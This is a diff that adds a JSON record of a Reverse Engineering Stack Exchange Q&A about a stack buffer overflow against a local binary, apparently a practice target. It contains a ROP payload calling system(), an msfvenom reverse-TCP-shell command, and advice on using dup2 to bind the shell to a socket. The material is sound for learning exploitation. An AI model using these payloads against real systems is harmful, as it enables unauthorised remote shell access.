@@ -1,0 +1,27 @@
+{
+    "title": "x64 buffer overflow - tcp shell payload",
+    "link": "https://reverseengineering.stackexchange.com/questions/31032/x64-buffer-overflow-tcp-shell-payload",
+    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  ASLR: off\nCanary: on\n </p>\n <p>\n  I have a binary that when run, it spawns zombie process on port 9191. I've been using ghidra and gdb to reverse engineer this and have found the buffer, canary, found the pop rdi location, shell location, system location - everything I need to do a buffer overflow. The problem I'm having is that when I insert the following payload:\n </p>\n <pre><code>payload = flat([\n    b'A'*72,  # Pad to canary (72)\n    canary,  # Our leaked canary (16)\n    8 * b'B', # padding\n    pop_rdi,\n    one, # shell\n    ret,\n    0x7ffff7a31420, # system\n])\n</code></pre>\n <p>\n  It crashes GDB with the error\n  <code>\n   process 6540 is executing new program: /bin/dash Error in re-setting breakpoint 1: No symbol table is loaded.  Use the \"file\" command.\n  </code>\n  . When running the script outside of GDB, the connection just closes and I get no info. On the server side after attempting to insert the payload I see\n  <code>\n   sh: 1: ��: not found\n  </code>\n  . I believe what is happening is that I need to insert a payload that opens a tcp shell utilizing msfvenom but when I insert the payload generated with\n  <code>\n   msfvenom -p windows/shell_reverse_tcp LHOST=localhost LPORT=9001 -b \"\\x00\" -f python -a x86 -e x86/shikata_ga_nai EXITFUNC=thread\n  </code>\n  to replace the\n  <code>\n   one\n  </code>\n  variable, I no longer get any indication a shell was opened on the server side, client side, OR on the listening port. I've tried various different locations with the same result. I'm not quite sure what I'm doing wrong, and any help would be appreciated!\n </p>\n</div>\n</body></html>",
+    "votes": "3",
+    "answers": 1,
+    "views": "98",
+    "tags": [
+        "disassembly",
+        "elf",
+        "x86-64",
+        "shellcode"
+    ],
+    "user": "Coop",
+    "time": "Oct 23, 2022 at 4:59",
+    "comments": [],
+    "answers_data": [
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <pre><code>process 6540 is executing new program: /bin/dash\nError in re-setting breakpoint 1: No symbol table is loaded.  Use the \"file\" command.\n</code></pre>\n <p>\n  That's not an error you need to worry about, it likely means your exploit worked, but GDB followed the forked\n  <code>\n   dash\n  </code>\n  process and wasn't able to re-apply your breakpoints from the original process. You could try setting\n  <code>\n   set follow-fork-mode parent\n  </code>\n  and\n  <code>\n   set detach-on-fork on\n  </code>\n  and let it continue separately.\n </p>\n <pre><code>sh: 1: ��: not found\n</code></pre>\n <p>\n  This also likely indicates that your exploit worked. However,\n  <code>\n   sh\n  </code>\n  is getting some unexpected garbage data, which it can't execute as a valid command. My suspicion is that this is because you have not duplicated\n  <code>\n   stdin/stdout\n  </code>\n  to the socket's file descriptor, e.g. using the\n  <code>\n   dup2\n  </code>\n  function. Think, how would the program know that input/output through the socket should be passed to standard in/out of the shell command you are executing? You may need to extend your ROP payload to include calls to\n  <code>\n   dup2\n  </code>\n  , and possibly additional logic to determine the file descriptor number of the socket if it's not predictable. If it's a simple program, it might be a low number like 3 or 4.\n </p>\n <blockquote>\n  <p>\n   I believe what is happening is that I need to insert a payload that opens a tcp shell utilizing msfvenom...to replace the\n   <code>\n    one\n   </code>\n   variable\n  </p>\n </blockquote>\n <p>\n  If you simply replaced the\n  <code>\n   one\n  </code>\n  varible with a shellcode payload, that wouldn't work at all. With a ROP payload, you are usually writing to non-executable memory, but you are specifying the address of the next instruction(s) to execute after a return. The CPU would try to return to whatever made-up address that the first 8 bytes of instructions appear as. But this could potentially work if you were able to write the shellcode payload to a known address within an executable page (or force the page to be executable), but that's likely more work than is necessary in this case since you already have things mostly working.\n </p>\n</div>\n</body></html>",
+            "votes": "3",
+            "user": "multithr3at3d",
+            "time": "Oct 31, 2022 at 0:16",
+            "is_accepted": false,
+            "comments": []
+        }
+    ]
+}
